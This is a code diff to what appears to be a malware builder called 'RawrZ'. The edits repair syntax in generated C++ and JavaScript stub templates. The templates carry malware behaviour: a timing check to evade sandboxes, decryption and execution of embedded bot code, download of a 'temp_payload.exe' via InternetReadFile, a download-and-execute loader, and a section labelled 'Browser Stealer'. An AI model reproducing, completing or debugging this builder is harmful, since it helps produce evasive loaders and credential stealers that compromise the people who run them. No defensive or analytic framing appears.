@@ -571,7 +571,7 @@ bot.run();`;
         auto start = std::chrono::high_resolution_clock::now();
         std::this_thread::sleep_for(std::chrono::milliseconds(100));
         auto end = std::chrono::high_resolution_clock::now();
-        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>`(end - start);
+        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);
         if (duration.count() < 50) {
             // Too fast - likely in sandbox
             return;
@@ -747,14 +747,14 @@ bot.run();`;
 // Stub ID: ${stubId}
 // Encryption: ${encryptionOptions.algorithm || 'none'}
 
-#include <iostream>`
-#include <windows.h>`
-#include <string>`
-#include <vector>`
-#include <fstream>`
-#include <sstream>`
-#include <cstring>`
-${encryptionOptions.algorithm ? '#include <openssl/aes.h>`\n#include <openssl/evp.h>`' : ''}
+#include <iostream>
+#include <windows.h>
+#include <string>
+#include <vector>
+#include <fstream>
+#include <sstream>
+#include <cstring>
+${encryptionOptions.algorithm ? '#include <openssl/aes.h>\n#include <openssl/evp.h>' : ''}
 
 class RawrZStub {
 private:
@@ -777,7 +777,7 @@ public:
         std::cout << "RawrZ Stub ${stubId} initializing..." << std::endl;
         
         // Decrypt and execute bot code
-        std::string decryptedCode = this->`decryptPayload();
+        std::string decryptedCode = this->decryptPayload();
         this->executeBotCode(decryptedCode);
     }
     
@@ -988,7 +988,7 @@ class RawrZStub {
     }
     
     run() {
-        console.log(\"RawrZ Stub ${stubId} initializing...\");
+        console.log(\`RawrZ Stub ${stubId} initializing...\`);
         
         // Decrypt and execute bot code
         const decryptedCode = this.decryptPayload();
@@ -1057,7 +1057,7 @@ class RawrZStub {
     
     executeBotCode(code) {
         // Write decrypted code to temporary file
-        const tempFile = path.join(os.tmpdir(), `temp_bot_${process.pid}.js`);
+        const tempFile = path.join(os.tmpdir(), 'temp_bot_' + process.pid + '.js');
         fs.writeFileSync(tempFile, code);
         
         try {
@@ -1268,7 +1268,7 @@ encryptionOptions.algorithm ? this.encryptBotCode(botCode, encryptionOptions) : 
                 char buffer[4096];
                 DWORD bytesRead;
                 std::ofstream file("temp_payload.exe", std::ios::binary);
-                while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead >` 0) {
+                while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
                     file.write(buffer, bytesRead);
                 }
                 file.close();
@@ -1536,7 +1536,7 @@ encryptionOptions.algorithm ? this.encryptBotCode(botCode, encryptionOptions) : 
     // JavaScript Loader Code
     getJavaScriptLoaderCode() {
         return `
-    startLoader() {
+    // startLoader() {
         console.log('Loader started...');
         try {
             // Download and execute payload
@@ -1586,7 +1586,7 @@ encryptionOptions.algorithm ? this.encryptBotCode(botCode, encryptionOptions) : 
         } catch (error) {
             console.error('Download/execute error:', error);
         }
-    }`;
+    `;
     }
 
     // JavaScript Browser Stealer Code
